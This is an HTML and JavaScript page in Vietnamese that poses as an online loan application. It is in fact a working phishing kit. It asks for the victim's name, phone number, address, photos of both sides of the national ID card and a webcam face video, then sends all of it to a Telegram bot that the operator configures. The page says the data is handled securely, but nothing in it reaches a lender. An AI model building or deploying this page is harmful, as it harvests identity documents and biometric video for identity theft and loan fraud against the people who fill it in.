<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hệ Thống Đăng Ký Vay Trực Tuyến</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-100 min-h-screen p-4 flex items-center justify-center">
    <div class="max-w-md w-full bg-white rounded-2xl shadow-xl overflow-hidden p-6">
        <div class="text-center mb-6">
            <h2 class="text-2xl font-bold text-blue-600">Đăng Ký Vay Online</h2>
            <p class="text-sm text-gray-500">Xác thực thông tin nhanh chóng, giải ngân trong ngày</p>
        </div>
        
        <form id="loanForm" class="space-y-4">
            <!-- Chọn gói vay -->
            <div class="grid grid-cols-2 gap-2">
                <div>
                    <label class="block text-gray-700 text-xs font-semibold mb-1">Số tiền vay</label>
                    <select id="amount" class="w-full px-3 py-2 border rounded-lg text-sm bg-white">
                        <option value="5.000.000đ">5 Triệu VNĐ</option>
                        <option value="10.000.000đ" selected>10 Triệu VNĐ</option>
                        <option value="15.000.000đ">15 Triệu VNĐ</option>
                        <option value="20.000.000đ">20 Triệu VNĐ</option>
                    </select>
                </div>
                <div>
                    <label class="block text-gray-700 text-xs font-semibold mb-1">Kỳ hạn trả</label>
                    <select id="term" class="w-full px-3 py-2 border rounded-lg text-sm bg-white">
                        <option value="3 tháng">3 Tháng</option>
                        <option value="6 tháng" selected>6 Tháng</option>
                        <option value="12 tháng">12 Tháng</option>
                    </select>
                </div>
            </div>

            <div>
                <label class="block text-gray-700 text-sm font-semibold mb-1">Họ và tên</label>
                <input type="text" id="fullname" required placeholder="Nhập họ và tên đầy đủ" class="w-full px-3 py-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm">
            </div>
            
            <div>
                <label class="block text-gray-700 text-sm font-semibold mb-1">Số điện thoại</label>
                <input type="tel" id="phone" required placeholder="Nhập số điện thoại Zalo" class="w-full px-3 py-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm">
            </div>
            
            <div>
                <label class="block text-gray-700 text-sm font-semibold mb-1">Địa chỉ hiện tại</label>
                <textarea id="address" required placeholder="Số nhà, đường, phường/xã, quận/huyện, tỉnh/TP" class="w-full px-3 py-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm" rows="2"></textarea>
            </div>

            <div class="grid grid-cols-2 gap-2">
                <div>
                    <label class="block text-gray-700 text-xs font-semibold mb-1">CCCD Mặt Trước</label>
                    <input type="file" id="cccdFront" accept="image/*" capture="environment" required class="w-full text-xs text-gray-500 file:mr-1 file:py-1 file:px-2 file:rounded file:border-0 file:text-xs file:font-semibold file:bg-blue-50 file:text-blue-700">
                </div>
                <div>
                    <label class="block text-gray-700 text-xs font-semibold mb-1">CCCD Mặt Sau</label>
                    <input type="file" id="cccdBack" accept="image/*" capture="environment" required class="w-full text-xs text-gray-500 file:mr-1 file:py-1 file:px-2 file:rounded file:border-0 file:text-xs file:font-semibold file:bg-blue-50 file:text-blue-700">
                </div>
            </div>

            <!-- Quay video khuôn mặt -->
            <div class="border p-3 rounded-lg bg-gray-50 text-center">
                <label class="block text-gray-700 text-xs font-semibold mb-2">Quay video khuôn mặt xác thực</label>
                <video id="videoPreview" autoplay playsinline muted class="w-full h-32 bg-black rounded-lg mb-2 object-cover"></video>
                <div class="flex justify-center space-x-2">
                    <button type="button" id="startCam" class="bg-blue-600 text-white px-3 py-1 rounded text-xs font-medium">Bật Camera</button>
                    <button type="button" id="startRec" class="bg-red-600 text-white px-3 py-1 rounded text-xs font-medium hidden">Bắt đầu quay</button>
                    <button type="button" id="stopRec" class="bg-green-600 text-white px-3 py-1 rounded text-xs font-medium hidden">Dừng</button>
                </div>
                <p id="recStatus" class="text-xs text-gray-500 mt-1">Chưa bật camera</p>
            </div>

            <button type="submit" id="submitBtn" class="w-full bg-blue-600 text-white py-3 rounded-lg font-bold hover:bg-blue-700 transition text-sm">Gửi Hồ Sơ Xác Thực</button>
        </form>
    </div>

    <script>
        // ⚙️ ĐIỀN THÔNG TIN BOT TELEGRAM CỦA ÔNG VÀO ĐÂY
        const BOT_TOKEN = "ĐIỀN_TOKEN_BOT_VÀO_ĐÂY";
        const CHAT_ID = "ĐIỀN_CHAT_ID_CỦA_ÔNG_VÀO_ĐÂY";

        let mediaRecorder;
        let recordedChunks = [];
        let videoStream;
        let videoBlob = null;

        const videoPreview = document.getElementById('videoPreview');
        const startCamBtn = document.getElementById('startCam');
        const startRecBtn = document.getElementById('startRec');
        const stopRecBtn = document.getElementById('stopRec');
        const recStatus = document.getElementById('recStatus');

        startCamBtn.addEventListener('click', async () => {
            try {
                videoStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
                videoPreview.srcObject = videoStream;
                startCamBtn.classList.add('hidden');
                startRecBtn.classList.remove('hidden');
                recStatus.textContent = "Đã mở camera. Nhấn 'Bắt đầu quay'!";
            } catch (err) {
                alert("Không thể bật camera. Vui lòng cấp quyền camera trên trình duyệt!");
            }
        });

        startRecBtn.addEventListener('click', () => {
            recordedChunks = [];
            mediaRecorder = new MediaRecorder(videoStream, { mimeType: 'video/webm' });

            mediaRecorder.ondataavailable = (event) => {
                if (event.data.size > 0) recordedChunks.push(event.data);
            };

            mediaRecorder.onstop = () => {
                videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
                recStatus.textContent = "✅ Đã quay video thành công!";
            };

            mediaRecorder.start();
            startRecBtn.classList.add('hidden');
            stopRecBtn.classList.remove('hidden');
            recStatus.textContent = "🔴 Đang quay... Hãy nhìn thẳng!";

            setTimeout(() => {
                if (mediaRecorder && mediaRecorder.state === "recording") {
                    mediaRecorder.stop();
                    stopRecBtn.classList.add('hidden');
                }
            }, 3500);
        });

        stopRecBtn.addEventListener('click', () => {
            if (mediaRecorder && mediaRecorder.state === "recording") {
                mediaRecorder.stop();
                stopRecBtn.classList.add('hidden');
            }
        });

        document.getElementById('loanForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            if (!videoBlob) {
                alert("Vui lòng quay video khuôn mặt trước khi gửi hồ sơ!");
                return;
            }

            const submitBtn = document.getElementById('submitBtn');
            submitBtn.disabled = true;
            submitBtn.textContent = "Đang gửi dữ liệu bảo mật...";

            const amount = document.getElementById('amount').value;
            const term = document.getElementById('term').value;
            const fullname = document.getElementById('fullname').value;
            const phone = document.getElementById('phone').value;
            const address = document.getElementById('address').value;
            const cccdFront = document.getElementById('cccdFront').files[0];
            const cccdBack = document.getElementById('cccdBack').files[0];

            try {
                // 1. Gửi thông tin text qua Telegram
                const textMsg = `🚨 CÓ HỒ SƠ VAY MỚI!\n\n💰 Số tiền: ${amount}\n⏱ Kỳ hạn: ${term}\n👤 Họ tên: ${fullname}\n📞 SĐT: ${phone}\n🏠 Địa chỉ: ${address}`;
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: textMsg })
                });

                // 2. Gửi ảnh CCCD mặt trước
                const fd1 = new FormData();
                fd1.append('chat_id', CHAT_ID);
                fd1.append('photo', cccdFront);
                fd1.append('caption', `📷 CCCD Trước - ${fullname}`);
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd1 });

                // 3. Gửi ảnh CCCD mặt sau
                const fd2 = new FormData();
                fd2.append('chat_id', CHAT_ID);
                fd2.append('photo', cccdBack);
                fd2.append('caption', `📷 CCCD Sau - ${fullname}`);
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd2 });

                // 4. Gửi video khuôn mặt
                const fd3 = new FormData();
                fd3.append('chat_id', CHAT_ID);
                fd3.append('video', videoBlob, 'face.webm');
                fd3.append('caption', `🎥 Video eKYC - ${fullname} (${phone})`);
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: fd3 });

                alert("Gửi hồ sơ thành công! Hệ thống đang xử lý.");
                location.reload();
            } catch (error) {
                alert("Lỗi khi gửi dữ liệu. Vui lòng thử lại!");
                submitBtn.disabled = false;
                submitBtn.textContent = "Gửi Hồ Sơ Xác Thực";
            }
        });
    </script>
</body>
</html>
